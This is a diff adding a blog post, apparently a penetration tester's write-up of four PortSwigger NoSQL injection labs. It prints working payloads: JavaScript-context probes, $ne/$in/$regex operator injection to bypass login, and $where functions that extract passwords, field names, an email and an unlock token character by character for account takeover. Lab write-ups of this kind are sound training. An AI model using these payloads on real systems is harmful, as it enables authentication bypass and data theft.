@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NoSQL Injection | Neslihan Gürgen</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+
+<body>
+
+    <header class="navbar">
+
+    <nav>
+
+        <a href="/">Home</a>
+
+        <a href="/posts/">Posts</a>
+
+        <a href="/research/">Research</a>
+
+        <a href="/projects/">Projects</a>
+
+        <a href="/categories/">Categories</a>
+
+        <a href="/cheat-sheets/">Cheat Sheets</a>
+
+    </nav>
+
+</header>
+
+    <div class="page">
+
+        <aside class="sidebar">
+
+        <div class="profile-image">
+            <img src="/assets/pinguu.jpg" alt="Neslihan Gürgen">        </div>
+
+        <h1>Neslihan Gürgen</h1>
+
+        <p class="role">
+            Junior Penetration Tester
+        </p>
+
+        <p class="bio">
+            Application Security |
+            Penetration Testing
+        </p>
+
+        <div class="social-links">
+            <a href="https://medium.com/@grgnes" target="_blank">Medium</a>
+            <a href="mailto:ngurgen08@gmail.com">Email</a>
+            <a href="https://github.com/grgnes" target="_blank">GitHub</a>
+            <a href="https://www.linkedin.com/in/neslihan-gurgen/" target="_blank">LinkedIn</a>
+        </div>
+
+    </aside>
+
+        <main class="content">
+            <article class="post-page">
+
+    <a class="category"
+       href="/categories/portswigger/">
+        PortSwigger
+    </a>
+
+    <h1>NoSQL Injection</h1>
+
+    <div class="date">
+        July 29, 2026
+    </div>
+
+    <div class="tags">
+        
+        <span>PortSwigger</span>
+        
+        <span>Web Security</span>
+        
+        <span>Injection</span>
+        
+    </div>
+
+    <div class="post-content">
+        <h2 id="introduction">Introduction</h2>
+
+<p>NoSQL Injection is a web security vulnerability that allows an attacker to manipulate NoSQL database queries. It usually occurs when user input is included in database queries without proper validation, allowing attackers to bypass authentication, access sensitive data, or modify database records.</p>
+
+<h2 id="labs">Labs</h2>
+
+<h3 id="01-detecting-nosql-injection">01. Detecting NoSQL injection</h3>
+
+<p>I used the normal category filter. The application worked as expected. This was my baseline request.</p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Gifts 
+</code></pre></div></div>
+
+<p><img src="/assets/posts/nosql/image.png" width="700" /></p>
+
+<p>I added a single quote (<code class="language-plaintext highlighter-rouge">'</code>) to the category value. The server returned a syntax error. This showed that the input was processed as JavaScript.</p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Gifts<span class="s1">' 
+</span></code></pre></div></div>
+
+<p><img src="/assets/posts/nosql/image (1).png" width="700" /></p>
+
+<p>I added another single quote to create a valid JavaScript expression. The query worked again without an error.</p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Gifts<span class="s1">'+'</span>
+</code></pre></div></div>
+
+<p><img src="/assets/posts/nosql/image (2).png" width="700" /></p>
+
+<p>I used the <code class="language-plaintext highlighter-rouge">' &amp;&amp; 0 &amp;&amp; 'x</code> payload. The condition was <strong>false</strong>, so no products were returned.</p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Gifts<span class="s1">' &amp;&amp; 0 &amp;&amp; '</span>x 
+</code></pre></div></div>
+
+<p><img src="/assets/posts/nosql/image (3).png" width="700" /></p>
+
+<p>I sent the <code class="language-plaintext highlighter-rouge">' &amp;&amp; 1 &amp;&amp; 'x</code> payload. The condition was <strong>true</strong>, so the products were displayed again.</p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Gifts<span class="s1">' &amp;&amp; 1 &amp;&amp; '</span>x 
+</code></pre></div></div>
+
+<p><img src="/assets/posts/nosql/image (4).png" width="700" /></p>
+
+<p>I used the <code class="language-plaintext highlighter-rouge">'||1||'</code> payload. The expression was always <strong>true</strong>, so hidden products were displayed. This confirmed the NoSQL Injection vulnerability.</p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Gifts<span class="s1">'||1||'</span> 
+</code></pre></div></div>
+
+<p><img src="/assets/posts/nosql/image (5).png" width="700" /></p>
+
+<h3 id="02-exploiting-nosql-operator-injection-to-bypass-authentication">02. Exploiting NoSQL operator injection to bypass authentication</h3>
+
+<p>I logged in with valid credentials. This confirmed the normal login behavior.</p>
+
+<p><img src="/assets/posts/nosql/image (6).png" width="700" /></p>
+
+<p>I tried to log in with an incorrect password. The server rejected the request.</p>
+
+<p><img src="/assets/posts/nosql/image (7).png" width="700" /></p>
+
+<p>I used the <code class="language-plaintext highlighter-rouge">$ne</code> operator in the password field. The server accepted the request.</p>
+
+<p><img src="/assets/posts/nosql/image (8).png" width="700" /></p>
+
+<p>I tested the same payload with the <strong>administrator</strong> account, but the login failed. I continued testing different payloads.</p>
+
+<p><img src="/assets/posts/nosql/image (9).png" width="700" /></p>
+
+<p>I used the <code class="language-plaintext highlighter-rouge">$in</code> operator in the username field. I analyzed the server response.</p>
+
+<p><img src="/assets/posts/nosql/image (10).png" width="700" /></p>
+
+<p>I added more users to the <code class="language-plaintext highlighter-rouge">$in</code> list. The request was successful and confirmed that the operator worked.</p>
+
+<p><img src="/assets/posts/nosql/image (11).png" width="700" /></p>
+
+<p>I sent a payload that matched multiple users. The server returned an error because too many records were found.</p>
+
+<p><img src="/assets/posts/nosql/image (12).png" width="700" /></p>
+
+<p>I used the <code class="language-plaintext highlighter-rouge">$regex</code> operator for the username. The server accepted the request and searched with a regular expression.</p>
+
+<p><img src="/assets/posts/nosql/image (13).png" width="700" /></p>
+
+<p>I used a more specific <code class="language-plaintext highlighter-rouge">$regex</code> expression. The login was successful with fewer matching users.</p>
+
+<p><img src="/assets/posts/nosql/image (14).png" width="700" /></p>
+
+<p>I combined the NoSQL operators to bypass authentication. I solved the lab.</p>
+
+<h3 id="03-exploiting-nosql-injection-to-extract-data">03. Exploiting NoSQL injection to extract data</h3>
+
+<p>I checked the API request for a normal user. I analyzed the JSON response to understand how the user data was returned.</p>
+
+<p><img src="/assets/posts/nosql/image (15).png" width="700" /></p>
+
+<p>I used a NoSQL Injection payload to target the <strong>administrator</strong> account. The server returned the administrator’s information.</p>
+
+<p><img src="/assets/posts/nosql/image (16).png" width="700" /></p>
+
+<p>I used the <code class="language-plaintext highlighter-rouge">this.username[0]</code> condition to test the first character of the username. I found the username one character at a time.</p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">administrator</span><span class="s1">'&amp;&amp;this.username[0]=='</span><span class="n">a</span>
+</code></pre></div></div>
+
+<p><img src="/assets/posts/nosql/image (17).png" width="700" /></p>
+
+<p>I used Burp Intruder to test the password length. I sent different values to find the correct length.</p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">administrator</span><span class="s1">'&amp;&amp;this.password.length=='</span><span class="mi">8</span>
+</code></pre></div></div>
+
+<p>I used the <code class="language-plaintext highlighter-rouge">this.password.length==8</code> condition. This confirmed that the administrator password was <strong>8 characters</strong> long.</p>
+
+<p><img src="/assets/posts/nosql/image (18).png" width="700" /></p>
+
+<p>I tested each password character one by one with brute force. I found the administrator password and solved the lab.</p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">administrator</span><span class="s1">'&amp;&amp;this.password[3]=='</span><span class="n">a</span>
+</code></pre></div></div>
+
+<h3 id="04-exploiting-nosql-operator-injection-to-extract-unknown-fields">04. Exploiting NoSQL operator injection to extract unknown fields</h3>
+
+<p>I sent a login request with an invalid password. I observed the normal error message.</p>
+
+<p><img src="/assets/posts/nosql/image (19).png" width="700" /></p>
+
+<p>I used the <code class="language-plaintext highlighter-rouge">$ne</code> operator in the password field. The account lock message confirmed the NoSQL Injection.</p>
+
+<p><img src="/assets/posts/nosql/image (20).png" width="700" /></p>
+
+<p>I used the <code class="language-plaintext highlighter-rouge">$where</code> function with true and false conditions. I compared the responses.</p>
+
+<p><img src="/assets/posts/nosql/image (21).png" width="700" /></p>
+
+<p><img src="/assets/posts/nosql/image (22).png" width="700" /></p>
+
+<p>1: account locked</p>
+
+<p>0: invalid username/password</p>
+
+<p>I tested <code class="language-plaintext highlighter-rouge">Object.keys(this)[0]</code> to find the first field name. This helped me discover the document fields.</p>
+
+<p><img src="/assets/posts/nosql/image (23).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="s2">"username"</span><span class="o">:</span> <span class="s2">"carlos"</span><span class="p">,</span>
+<span class="s2">"password"</span><span class="o">:</span> <span class="p">{</span>
+     <span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span><span class="o">:</span> <span class="s2">""</span>
+     <span class="p">},</span>
+<span class="s2">"</span><span class="nv">$where</span><span class="s2">"</span><span class="o">:</span> <span class="s2">"function(){ if(Object.keys(this)[0].match('username')) return 1; else 0; }"</span>
+ <span class="p">}</span>
+</code></pre></div></div>
+
+<p>After finding the first field, I tested the second one and continued discovering field names.</p>
+
+<p><img src="/assets/posts/nosql/image (24).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="s2">"username"</span><span class="o">:</span> <span class="s2">"carlos"</span><span class="p">,</span>
+<span class="s2">"password"</span><span class="o">:</span> <span class="p">{</span>
+     <span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span><span class="o">:</span> <span class="s2">""</span>
+     <span class="p">},</span>
+<span class="s2">"</span><span class="nv">$where</span><span class="s2">"</span><span class="o">:</span> <span class="s2">"function(){ if(Object.keys(this)[0].match('_id')) return 1; else 0; }"</span>
+ <span class="p">}</span>
+</code></pre></div></div>
+
+<p>I tested different field names and identified the fields used by the application.</p>
+
+<p><img src="/assets/posts/nosql/image (25).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="s2">"username"</span><span class="o">:</span> <span class="s2">"carlos"</span><span class="p">,</span>
+<span class="s2">"password"</span><span class="o">:</span> <span class="p">{</span>
+     <span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span><span class="o">:</span> <span class="s2">""</span>
+     <span class="p">},</span>
+<span class="s2">"</span><span class="nv">$where</span><span class="s2">"</span><span class="o">:</span> <span class="s2">"function(){ if(Object.keys(this)[4].match('aa')) return 1; else 0; }"</span>
+ <span class="p">}</span>
+</code></pre></div></div>
+
+<p>I analyzed the server response when I used an incorrect field name. This helped me identify valid fields.</p>
+
+<p>I used Burp Intruder to test the field name length. I found the correct length.</p>
+
+<p><img src="/assets/posts/nosql/image (26).png" width="700" /></p>
+
+<p><img src="/assets/posts/nosql/image (27).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"</span><span class="nv">$where</span><span class="s2">"</span><span class="o">:</span> <span class="s2">"function(){ if(Object.keys(this)[3].length==1) return 1; else 0; }"</span>
+</code></pre></div></div>
+
+<p>I tested the field name with regular expressions. I started building the field name.</p>
+
+<p><img src="/assets/posts/nosql/image (28).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"</span><span class="nv">$where</span><span class="s2">"</span><span class="o">:</span> <span class="s2">"function(){ if(Object.keys(this)[3].match(/^a/) return 1; else 0; }
+</span></code></pre></div></div>
+
+<p>I continued the regular expression tests and found the field name <strong>email</strong>.</p>
+
+<p><img src="/assets/posts/nosql/image (29).png" width="700" /></p>
+
+<p>I tested the length of the <strong>email</strong> field. I found the correct number of characters.</p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"</span><span class="nv">$where</span><span class="s2">"</span><span class="o">:</span> <span class="s2">"function(){ if(this.email.length == 1) return 1; else 0; }"</span>
+</code></pre></div></div>
+
+<p>I used Burp Intruder to brute force the email address one character at a time.</p>
+
+<p><img src="/assets/posts/nosql/image (30).png" width="700" /></p>
+
+<p>I used regular expressions to extract the first part of the email address.</p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"</span><span class="nv">$where</span><span class="s2">"</span><span class="o">:</span> <span class="s2">"function(){ if(this.email.match(/^a/)) return 1; else 0; }"</span>
+</code></pre></div></div>
+
+<p>carlos@carlos-montoya.net  → I completed the brute force process and extracted the full email address.</p>
+
+<p>I used the same technique to target the <code class="language-plaintext highlighter-rouge">unlockToken</code> field.</p>
+
+<p><img src="/assets/posts/nosql/image (31).png" width="700" /></p>
+
+<ul>
+  <li>Injection</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"</span><span class="nv">$where</span><span class="s2">"</span><span class="o">:</span> <span class="s2">"function(){ if(Object.keys(this)[4].match(/^a/) ) return 1; else 0; }"</span>
+</code></pre></div></div>
+
+<p>b92f656fecdeefee → I used the <code class="language-plaintext highlighter-rouge">unlockToken</code> value in the password reset request. I accessed the password reset page.</p>
+
+<p><img src="/assets/posts/nosql/image (32).png" width="700" /></p>
+
+<p>I reset the password, accessed the administrator account, and solved the lab.</p>
+
+    </div>
+
+</article>
+        </main>
+
+    </div>
+
+    <footer>
+    © 2026 Neslihan Gürgen
+</footer>
+
+</body>
+</html>
